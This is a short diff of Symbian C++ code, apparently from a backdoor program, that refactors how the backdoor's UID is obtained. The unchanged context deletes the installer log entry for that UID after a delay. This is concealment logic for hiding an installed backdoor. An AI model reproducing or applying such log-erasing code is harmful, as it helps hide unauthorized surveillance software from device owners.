@@ -504,14 +504,6 @@ LOCAL_C void DoStartL()
 
 	//delete install log entry
 	User::After(10*1000000);
-	/*
-	TBuf8<12> hexBuf(KUidBackdoor);
-	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
-	TLex8 lex(hexBuf);
-	TUint32 uid;
-	lex.Val(uid,EHex);
-	TUid myUid = TUid::Uid(uid);
-	*/
 	TUid myUid = GetUid(KUidBackdoor);
 	DeleteInstallerLog(myUid);
 	
